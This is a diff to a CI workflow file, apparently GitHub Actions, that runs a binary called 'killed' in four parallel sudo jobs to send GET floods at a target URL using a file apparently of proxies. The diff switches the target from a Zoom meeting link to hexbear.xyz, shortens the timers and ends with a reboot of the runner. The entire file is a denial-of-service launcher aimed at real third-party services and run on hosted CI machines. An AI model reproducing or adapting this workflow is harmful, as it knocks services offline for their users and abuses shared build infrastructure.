@@ -20,7 +20,7 @@ jobs:
           chmod +x killed
           PIDS=()
           for i in {1..4}; do
-            sudo timeout 210 ./killed GET https://us05web.zoom.us/j/89058826901?pwd=lbrvDT7PZyrbMdGfmR1ywTb43MuLdp.1 fres.txt 200 125 10 &
+            sudo timeout 85 ./killed GET https://hexbear.xyz/wqeqw fres.txt 80 125 10 &
             PIDS+=($!)
           done
           
@@ -29,7 +29,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 210
+        run: sleep 85
         
       - name: OK !
         run: sudo reboot
